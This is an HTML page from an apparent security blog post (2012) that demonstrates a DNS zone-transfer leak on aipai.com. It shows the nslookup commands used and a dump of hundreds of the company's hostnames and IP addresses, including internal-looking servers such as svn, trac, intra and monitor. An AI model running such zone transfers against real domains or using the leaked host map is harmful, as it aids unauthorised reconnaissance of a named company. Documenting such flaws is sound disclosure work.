@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>爱拍DNS域传送漏洞 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-09-24T21:41:21.000Z" itemprop="datePublished">
+          2012-09-25
+      </time>
+    
+    
+    | 
+    <a href='/tag/DNS域传送/'>DNS域传送</a>
+    
+    
+</span>
+    <h1 class="post-title">爱拍DNS域传送漏洞</h1>
+    <section class="post-content">
+      <p>关于<a href="http://ha.cker.in/tag/DNS域传送" target="_blank">DNS域传送</a>漏洞 ：<a href="http://ha.cker.in/847.seo">DNS域传送泄露漏洞详解</a></p>  <p>&#160;</p>  <p>爱拍DNS域传送漏洞演示：</p>  <p><a href="http://img.cker.in/DNS_C06C/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/DNS_C06C/clip_image001_thumb.png" width="429" height="593"></a></p>  <p>&#160;</p>  <p>nslookup命令：</p>  <p>&gt; server 8.8.8.8</p>  <p>(root) nameserver = E.ROOT-SERVERS.NET</p>  <p>(root) nameserver = F.ROOT-SERVERS.NET</p>  <p>(root) nameserver = G.ROOT-SERVERS.NET</p>  <p>(root) nameserver = H.ROOT-SERVERS.NET</p>  <p>(root) nameserver = I.ROOT-SERVERS.NET</p>  <p>(root) nameserver = J.ROOT-SERVERS.NET</p>  <p>(root) nameserver = K.ROOT-SERVERS.NET</p>  <p>(root) nameserver = L.ROOT-SERVERS.NET</p>  <p>(root) nameserver = M.ROOT-SERVERS.NET</p>  <p>(root) nameserver = A.ROOT-SERVERS.NET</p>  <p>(root) nameserver = B.ROOT-SERVERS.NET</p>  <p>(root) nameserver = C.ROOT-SERVERS.NET</p>  <p>(root) nameserver = D.ROOT-SERVERS.NET</p>  <p>Default Server: [8.8.8.8]</p>  <p>Address: 8.8.8.8</p>  <p>&gt; aipai.com</p>  <p>Server: [8.8.8.8]</p>  <p>Address: 8.8.8.8</p>  <p>DNS request timed out.</p>  <p>timeout was 2 seconds.</p>  <p>Non-authoritative answer:</p>  <p>aipai.com nameserver = ns2.aipai.com</p>  <p>aipai.com nameserver = ns1.aipai.com</p>  <p>&gt; server ns1.aipai.com</p>  <p>Default Server: ns1.aipai.com</p>  <p>Address: 121.10.241.93</p>  <p>&gt; ls aipai.com</p>  <p>[ns1.aipai.com]</p>  <p><strong><em> Can’t list domain aipai.com: Query refused</em></strong></p>  <p>&gt; server ns2.aipai.com</p>  <p>Default Server: ns2.aipai.com</p>  <p>Address: 121.10.241.94</p>  <p>&gt; ls aipai.com</p>  <p>[ns2.aipai.com]</p>  <p> ls: error receiving zone transfer:</p>  <p>result: NOERROR, answers = 768, authority = 0, additional = 0</p>  <p><em>*</em> Can’t list domain aipai.com: Unspecified error</p>  <p>&gt; ls aipai.com &gt; aipai.txt</p>  <p>[ns2.aipai.com]</p>  <p>#</p>  <p>Received 454 records.</p>  <p>C:\Documents and Settings\Administrator\aipai.txt</p>  <p>&gt; ls aipai.com </p>  <p>[ns2.aipai.com]</p>  <p>aipai.com. NS server = ns1.aipai.com</p>  <p>aipai.com. NS server = ns2.aipai.com</p>  <p>aipai.com. A 121.10.241.70</p>  <p>aipai.com. A 121.10.241.89</p>  <p>17gy A 121.10.241.126</p>  <p>a1 A 61.130.97.36</p>  <p>a2 A 61.130.97.37</p>  <p>apas A 121.10.241.82</p>  <p>b1 A 61.130.97.36</p>  <p>b2 A 61.130.97.37</p>  <p>b3 A 122.225.115.67</p>  <p>b4 A 122.225.115.68</p>  <p>b5 A 122.225.115.72</p>  <p>b6 A 122.225.115.73</p>  <p>b7 A 122.225.115.71</p>  <p>bbs A 121.10.241.85</p>  <p>bbsrv A 121.10.241.75</p>  <p>bgpupload A 180.185.0.123</p>  <p>bus A 121.10.241.69</p>  <p>bus2 A 121.10.241.68</p>  <p>c1 A 61.130.97.36</p>  <p>c10 A 61.130.97.248</p>  <p>c10 A 61.130.97.249</p>  <p>c11 A 60.190.28.56</p>  <p>c11 A 61.130.97.250</p>  <p>c11 A 61.130.97.251</p>  <p>c11 A 61.164.79.228</p>  <p>c11 A 61.164.79.229</p>  <p>c12 A 60.190.28.53</p>  <p>c12 A 60.190.28.54</p>  <p>c12 A 60.190.28.59</p>  <p>c12 A 61.164.79.226</p>  <p>c12 A 61.164.79.227</p>  <p>c12 A 61.164.79.231</p>  <p>c12 A 61.164.79.232</p>  <p>c14 A 61.130.97.38</p>  <p>c2 A 61.130.97.37</p>  <p>c3 A 122.225.115.67</p>  <p>c4 A 122.225.115.68</p>  <p>c5 A 122.225.115.72</p>  <p>c6 A 122.225.115.73</p>  <p>c7 A 122.225.115.71</p>  <p>c8 A 122.225.115.75</p>  <p>c8 A 122.225.115.76</p>  <p>c9 A 122.225.115.79</p>  <p>c9 A 122.225.115.80</p>  <p>comment A 121.10.241.73</p>  <p>bbs.corp A 121.10.241.111</p>  <p>crashrpt A 121.10.241.93</p>  <p>da01 A 121.10.241.109</p>  <p>da02 A 121.10.241.109</p>  <p>da03 A 121.10.241.109</p>  <p>da04 A 121.10.241.105</p>  <p>dashi A 121.10.241.75</p>  <p>download A 121.10.241.91</p>  <p>fa1 A 121.10.241.91</p>  <p>fa2 A 121.10.241.92</p>  <p>fb1 A 121.10.241.91</p>  <p>fb10 A 121.10.241.100</p>  <p>fb11 A 121.10.241.101</p>  <p>fb12 A 121.10.241.102</p>  <p>fb13 A 121.10.241.103</p>  <p>fb14 A 121.10.241.104</p>  <p>fb2 A 121.10.241.92</p>  <p>fb3 A 121.10.241.93</p>  <p>fb4 A 121.10.241.94</p>  <p>fb5 A 121.10.241.95</p>  <p>fb6 A 121.10.241.96</p>  <p>fb7 A 121.10.241.97</p>  <p>fb8 A 121.10.241.98</p>  <p>fb9 A 121.10.241.99</p>  <p>fc1 A 121.10.241.91</p>  <p>fc10 A 121.10.241.100</p>  <p>fc11 A 121.10.241.101</p>  <p>fc12 A 121.10.241.76</p>  <p>fc13 A 121.10.241.103</p>  <p>fc14 A 121.10.241.104</p>  <p>fc2 A 121.10.241.92</p>  <p>fc3 A 121.10.241.93</p>  <p>fc4 A 121.10.241.94</p>  <p>fc5 A 121.10.241.95</p>  <p>fc6 A 121.10.241.96</p>  <p>fc7 A 121.10.241.97</p>  <p>fc8 A 121.10.241.98</p>  <p>fc9 A 121.10.241.99</p>  <p>fk001 A 122.226.73.51</p>  <p>fkin001 A 122.226.100.234</p>  <p>fp1 A 121.10.241.91</p>  <p>fp10 A 121.10.241.100</p>  <p>fp11 A 121.10.241.101</p>  <p>fp12 A 121.10.241.102</p>  <p>fp13 A 121.10.241.103</p>  <p>fp14 A 121.10.241.104</p>  <p>fp2 A 121.10.241.92</p>  <p>fp3 A 121.10.241.93</p>  <p>fp4 A 121.10.241.94</p>  <p>fp5 A 121.10.241.95</p>  <p>fp6 A 121.10.241.96</p>  <p>fp7 A 121.10.241.97</p>  <p>fp8 A 121.10.241.98</p>  <p>fp9 A 121.10.241.99</p>  <p>fs1 A 121.10.241.91</p>  <p>fs10 A 121.10.241.100</p>  <p>fs11 A 121.10.241.101</p>  <p>fs12 A 121.10.241.102</p>  <p>fs13 A 121.10.241.103</p>  <p>fs14 A 121.10.241.104</p>  <p>fs2 A 121.10.241.92</p>  <p>fs3 A 121.10.241.93</p>  <p>fs4 A 121.10.241.94</p>  <p>fs5 A 121.10.241.95</p>  <p>fs6 A 121.10.241.96</p>  <p>fs7 A 121.10.241.97</p>  <p>fs8 A 121.10.241.98</p>  <p>fs9 A 121.10.241.99</p>  <p>fu1 A 121.10.241.87</p>  <p>fu10 A 121.10.241.100</p>  <p>fu11 A 121.10.241.101</p>  <p>fu12 A 121.10.241.102</p>  <p>fu13 A 121.10.241.103</p>  <p>fu14 A 121.10.241.104</p>  <p>fu2 A 121.10.241.92</p>  <p>fu3 A 121.10.241.93</p>  <p>fu4 A 121.10.241.94</p>  <p>fu5 A 121.10.241.95</p>  <p>fu6 A 121.10.241.96</p>  <p>fu7 A 121.10.241.97</p>  <p>fu8 A 121.10.241.98</p>  <p>fu9 A 121.10.241.99</p>  <p>h001 A 115.236.59.82</p>  <p>hb001 A 115.236.59.83</p>  <p>hc1 A 60.55.32.194</p>  <p>hc1 A 60.55.32.195</p>  <p>hc1 A 60.55.32.196</p>  <p>hc1 A 60.55.32.197</p>  <p>hc1 A 60.55.32.199</p>  <p>hc1 A 60.55.32.201</p>  <p>hc1 A 60.190.28.52</p>  <p>hc1 A 61.130.97.247</p>  <p>hc1 A 119.134.253.99</p>  <p>hc1 A 119.134.253.100</p>  <p>hc1 A 119.134.253.101</p>  <p>hc1 A 119.134.253.103</p>  <p>hc1 A 119.134.253.104</p>  <p>hc1 A 119.134.253.105</p>  <p>hc1 A 122.227.254.162</p>  <p>hc1 A 122.227.254.163</p>  <p>hc1 A 122.227.254.165</p>  <p>hc1 A 122.227.254.166</p>  <p>hc1 A 122.227.254.169</p>  <p>hc1 A 122.227.254.170</p>  <p>hh0001 A 122.226.73.50</p>  <p>hh001 A 122.226.73.52</p>  <p>hh002 A 122.226.100.234</p>  <p>hh003 A 122.226.100.232</p>  <p>hh004 A 122.226.73.53</p>  <p>hh005 A 122.226.100.233</p>  <p>hh006 A 122.226.73.51</p>  <p>hh008 A 122.226.100.235</p>  <p>intra A 121.10.241.107</p>  <p>iphone A 61.130.97.242</p>  <p>localhost A 127.0.0.1</p>  <p>mail A 121.10.241.109</p>  <p>monitor A 180.185.0.122</p>  <p>mx01 A 121.10.241.109</p>  <p>nb001 A 118.186.35.29</p>  <p>notify A 121.10.241.80</p>  <p>ns1 A 121.10.241.93</p>  <p>ns11 A 121.10.241.93</p>  <p>ns12 A 121.10.241.94</p>  <p>ns2 A 121.10.241.94</p>  <p>p1 A 121.10.241.91</p>  <p>p10 A 121.10.241.100</p>  <p>p11 A 121.10.241.101</p>  <p>p12 A 121.10.241.102</p>  <p>p14 A 121.10.241.104</p>  <p>p2 A 121.10.241.92</p>  <p>p3 A 121.10.241.93</p>  <p>p4 A 121.10.241.94</p>  <p>p5 A 121.10.241.95</p>  <p>p6 A 121.10.241.96</p>  <p>p7 A 121.10.241.97</p>  <p>p8 A 121.10.241.98</p>  <p>p9 A 121.10.241.99</p>  <p>puppet A 121.10.241.106</p>  <p>rtx A 121.10.241.112</p>  <p>search A 121.10.241.81</p>  <p>star A 121.10.241.85</p>  <p>stats A 121.10.241.73</p>  <p>svn A 121.10.241.107</p>  <p>tc12 A 61.164.79.226</p>  <p>tc12 A 61.164.79.231</p>  <p>trac A 121.10.241.108</p>  <p>u1 A 121.10.241.91</p>  <p>u10 A 121.10.241.100</p>  <p>u11 A 121.10.241.101</p>  <p>u12 A 121.10.241.102</p>  <p>u14 A 121.10.241.104</p>  <p>u2 A 121.10.241.92</p>  <p>u3 A 121.10.241.93</p>  <p>u4 A 121.10.241.94</p>  <p>u5 A 121.10.241.95</p>  <p>u6 A 121.10.241.96</p>  <p>u7 A 121.10.241.97</p>  <p>u8 A 121.10.241.98</p>  <p>u9 A 121.10.241.99</p>  <p>update A 121.10.241.91</p>  <p>urs A 121.10.241.69</p>  <p>web A 122.226.84.158</p>  <p>wshc1 A 60.55.32.198</p>  <p>wshc1 A 119.134.253.98</p>  <p>wshc1 A 119.134.253.102</p>  <p>www A 121.10.241.70</p>  <p>www A 121.10.241.89</p>  <p>www-1 A 121.10.241.71</p>  <p>www-2 A 121.10.241.72</p>  <p>www-3 A 121.10.241.73</p>  <p>www-4 A 121.10.241.74</p>  <p>www1 A 121.10.241.75</p>  <p>www2 A 121.10.241.73</p>  <p>s1.x5 A 122.226.73.52</p>  <p>xwcjq A 121.10.241.116</p>  <p>zenoss A 121.10.241.110</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/849.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/849.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/849.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/849.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/852.seo/">
+        ← 对居然之家的一次内网渗透
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/847.seo/">
+        DNS域传送泄露漏洞详解 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
